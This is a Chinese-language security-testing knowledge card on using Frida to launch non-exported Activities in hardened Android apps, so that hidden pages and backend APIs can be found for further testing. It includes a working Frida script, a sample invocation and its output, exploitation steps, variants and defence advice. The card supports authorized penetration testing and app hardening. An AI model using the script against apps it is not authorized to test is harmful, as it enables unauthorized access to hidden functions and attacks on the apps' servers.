---
id: mobile-android-frida-jump-internal-activity
title: Frida 直接启动未导出 Activity：加固 APP 隐藏功能与接口发现
type: scenario
domain: mobile
path: mobile/android
technique: frida-start-internal-activity
aliases:
- jumpToActivity
- Frida 启动 Activity
- 未导出 Activity
- hidden activity
- AndroidManifest 枚举 Activity
- 加固 APP 动态测试
tags:
- android
- frida
- activity
- intent
- hardening
- hidden-feature
- mobile
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:27:05+08:00'
  notes: 已对照原文与 img/02、03、04 核对：梆梆加固、Frida jumpToActivity 脚本、cn...webviews.GroupActivity 启动回显与分享页面一致；卡如实说明 exported=false 的进程内启动原理，保留。
---

## 一句话结论

加固 APP 静态反编译被壳挡住、应用又只暴露登录入口时，可以从 `AndroidManifest.xml` 枚举内部 Activity 类名，用 Frida 注入目标进程后以应用上下文构造显式 Intent 并 `startActivity`，直接跳过 `exported=false` 限制拉起未导出/隐藏 Activity，触达分享、调试、管理等功能并抓包发现新接口。

## 原理

- `android:exported="false"` 只阻止其他应用通过 Intent 启动该组件；它不阻止同一应用进程内的代码启动自己的 Activity。Frida 注入后在目标进程内执行，相当于应用自己启动自己，因此可以绕过导出限制。
- `ActivityThread.currentApplication()` 可以拿到当前 Application；用 `Intent.setClassName(context, className)` 构造显式 Intent，再 `context.startActivity(intent)`。使用 Application Context 启动 Activity 必须加 `FLAG_ACTIVITY_NEW_TASK`。
- 加固（如梆梆企业版）主要保护 dex 不被静态反编译，`AndroidManifest.xml` 通常仍是明文，Activity 类名可直接从清单中枚举；运行时壳已把真实 dex 解密到内存，Frida 能正常加载类并调用框架 API。
- 直接启动隐藏 Activity 后，页面会按其正常逻辑发起 API 请求；用 Burp/抓包即可看到原本需要特定入口才能触发的接口，为未授权访问、越权、SQL 注入等测试提供入口。
- 文章样本即通过该方式进入“分享”页面，触发二维码下载地址查询接口，并发现 `shareType` 参数的 SQL 注入。

## 触发条件

- 测试设备已 root 或可运行 Frida Server，能 spawn/attach 目标 APP；加固 APP 可能带反调试/反 Frida，需要先处理。
- 能从 APK 的 `AndroidManifest.xml` 枚举 Activity 类名（即使 dex 被加固）。
- 目标 Activity 在启动时不需要特殊 extras/登录态；若需要，可在脚本中补充 extras。
- 目标 Activity 的类在运行时能被加载（未被壳在启动阶段拦截）。

## 利用步骤

1. 用 MT 管理器/apktool 提取 APK，查看 `AndroidManifest.xml`，枚举所有 `activity` 及其 `android:name`（相对类名需补全包名）。
2. 启动 Frida（spawn 模式）并加载脚本，等待 `Java.perform` 在应用进程内执行。
3. 调用 `jumpToActivity("com.example.app.ui.DebugActivity")`；相对类名 `.ui.DebugActivity` 会自动补全包名。
4. 如需参数，传入 extras（字符串/布尔/整数），脚本会按类型选择 `putExtra` 重载。
5. 观察 APP 跳转后的页面，用 Burp/抓包记录其 API 请求，继续测试未授权、越权、注入等漏洞。

## PoC

精简后的 Frida 脚本（文章原脚本的核心逻辑）：

```javascript
function jumpToActivity(className, extras) {
  Java.perform(function () {
    var ActivityThread = Java.use('android.app.ActivityThread');
    var app = ActivityThread.currentApplication();
    if (app == null) return;
    var context = app.getApplicationContext();

    if (className.startsWith('.')) {
      className = context.getPackageName() + className;
    }

    var Intent = Java.use('android.content.Intent');
    var intent = Intent.$new();
    intent.setClassName(context, className);
    intent.addFlags(0x10000000); // FLAG_ACTIVITY_NEW_TASK

    if (extras) {
      var putExtraStr = intent.putExtra.overload('java.lang.String', 'java.lang.String');
      var putExtraBool = intent.putExtra.overload('java.lang.String', 'boolean');
      var putExtraInt = intent.putExtra.overload('java.lang.String', 'int');
      Object.keys(extras).forEach(function (k) {
        var v = extras[k];
        if (typeof v === 'string') putExtraStr.call(intent, k, v);
        else if (typeof v === 'boolean') putExtraBool.call(intent, k, v);
        else if (Number.isInteger(v)) putExtraInt.call(intent, k, v);
      });
    }

    Java.scheduleOnMainThread(function () {
      context.startActivity(intent);
      console.log('已启动 Activity: ' + className);
    });
  });
}

// 调用示例
jumpToActivity('com.example.app.ui.DebugActivity');
// jumpToActivity('.ui.DetailActivity', { item_id: 'A1001', fromPush: true });
```

文章中的实际调用与回显：

```text
[Remote::cn...] -> jumpToActivity('cn....webviews.GroupActivity')
[Remote::cn...] -> 已启动 Activity: cn....webviews.GroupActivity
```

## 变体与关联

- 变体：用 `am start -n <pkg>/<activity>` 从 adb shell 启动；非导出组件通常会被 `SecurityException` 拒绝，Frida 进程内方式更可靠。
- 变体：结合 `frida-dexdump` 先从内存 dump 出真实 dex，再用 jadx 找到更多 Activity/接口；见 [[mobile-android-packer-apkid-frida-dexdump-jadx]]。
- 变体：对需要登录态的 Activity，先 hook 登录/Token 逻辑或直接注入 Cookie/Token 后再启动。
- 关联：[[mobile-android-exported-activity-unauth-changepassword-phishing]]（导出 Activity 的未授权访问，与本卡的“进程内启动未导出 Activity”互补）。
- 边界：APP 有强反 Frida/反调试导致注入失败、Activity 在启动时校验调用方/签名、或所需数据必须由前置页面传递时，需要额外处理。

## 检测与防御

- 检测：APP 侧可检测 Frida/root/调试器（但客户端检测可被绕过）；服务端应对所有接口做鉴权与参数校验，不能依赖“入口隐藏”。
- 防御：不要用“未导出 Activity/隐藏页面”作为安全边界；所有 API 都必须独立做认证、授权和输入校验。
- 加固：对敏感 Activity 增加调用方校验/签名校验；对 Intent 传入参数做严格校验；使用 Frida 检测、完整性校验和反调试提高动态分析成本。
